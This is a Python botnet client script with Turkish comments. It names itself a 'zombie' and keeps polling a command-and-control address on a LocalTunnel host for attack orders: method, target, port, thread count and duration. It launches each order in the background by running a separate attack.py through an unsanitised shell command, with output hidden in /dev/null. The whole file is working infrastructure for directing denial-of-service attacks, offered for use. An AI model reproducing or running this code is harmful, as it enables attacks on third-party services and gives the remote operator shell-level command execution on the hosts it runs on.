import os
import time
import requests
import threading

# --- AYARLAR ---
# Senin paylaştığın LocalTunnel linki (Beyin adresi)
MASTER_URL = "https://shy-otters-trade.loca.lt" 
ZOMBI_AD = f"Zombi-{os.uname()[1]}"

def komut_dinle():
    # İlk çalıştığında ekrana bilgi ver
    print(f"🚀 {ZOMBI_AD} uyanıyor... Beyin'e bağlanmaya çalışılıyor: {MASTER_URL}")
    
    while True:
        try:
            # Beyin'den (Panelden) emirleri çek
            # LocalTunnel bazen 'user-agent' kontrolü yapabilir, o yüzden header ekliyoruz
            headers = {'User-Agent': 'Zombi-Ordu-V1'}
            response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                # Komut verilerini ayrıştır
                method = data.get("method")
                target = data.get("target")
                port = data.get("port")
                sure = data.get("duration")
                
                # THREAD AYARI: Panelden gelirse onu kullanır, gelmezse 100 ile vurur
                threads = data.get("threads", 100)

                if method and target:
                    print(f"🔥 EMİR ALINDI! Metod: {method.upper()} | Hedef: {target}:{port} | Thread: {threads}")
                    
                    # Attack.py'yi Python3 üzerinden, thread ve süre parametreleriyle tetikle
                    # Çıktıları /dev/null'a atıyoruz ki zombi terminali temiz kalsın
                    cmd = f"nohup python3 attack.py {method} {target} {port} {threads} {sure} > /dev/null 2>&1 &"
                    os.system(cmd)
                    print(f"✅ Saldırı arka planda başlatıldı.")

            # Paneli yormamak için 5 saniyede bir kontrol et
            time.sleep(5)
            
        except requests.exceptions.ConnectionError:
            print("⚠️ Beyin'e ulaşılamıyor (LocalTunnel kapalı veya link değişmiş olabilir)...")
            time.sleep(15)
        except Exception as e:
            print(f"⚠️ Beklenmedik hata: {e}")
            time.sleep(10)

if __name__ == "__main__":
    # Dosya izinlerini kontrol et (İhtiyatlı davranıyoruz)
    os.system("chmod +x attack.py slave.py")
    komut_dinle()
